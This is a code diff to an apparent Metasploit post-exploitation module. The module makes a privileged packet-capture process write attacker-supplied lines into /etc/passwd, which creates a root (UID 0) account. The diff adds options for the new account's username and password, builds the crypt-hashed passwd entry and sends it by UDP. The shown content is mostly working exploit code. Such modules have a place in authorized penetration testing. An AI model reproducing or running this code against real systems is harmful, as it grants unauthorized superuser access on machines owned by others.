@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Post
 					filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within.
 					This, and all the other packets, are appended to /etc/passwd.
 
-					Successful exploitation results in the creation of a 'metasploit' superuser with password 'metasploit'.
+					Successful exploitation results in the creation of a new superuser account.
 
 					This module requires manual clean-up - remove /tmp/msf3-session*pcap files and truncate /etc/passwd.
 				},
@@ -60,8 +60,10 @@ class Metasploit3 < Msf::Post
 			}
 			))
 			register_options(
-			[
-				Opt::RPORT(2940)
+			[	
+				Opt::RPORT(2940),
+				OptString.new("USERNAME", [ true, "Username for the new superuser", "metasploit" ]),
+				OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ])
 			], self)
 	end
 
@@ -78,7 +80,7 @@ class Metasploit3 < Msf::Post
 			i = i+1
 			if(cmd_exec("cat /etc/passwd | wc -l") != initial_size)  then
 				# PCAP is flowing
-				pkt = "\n\nmetasploit:me6dSmAVu0TRU:0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
+				pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
 				print_status("Sending file contents payload to #{session.session_host}")
 				udpsock = Rex::Socket::Udp.create(
 				{
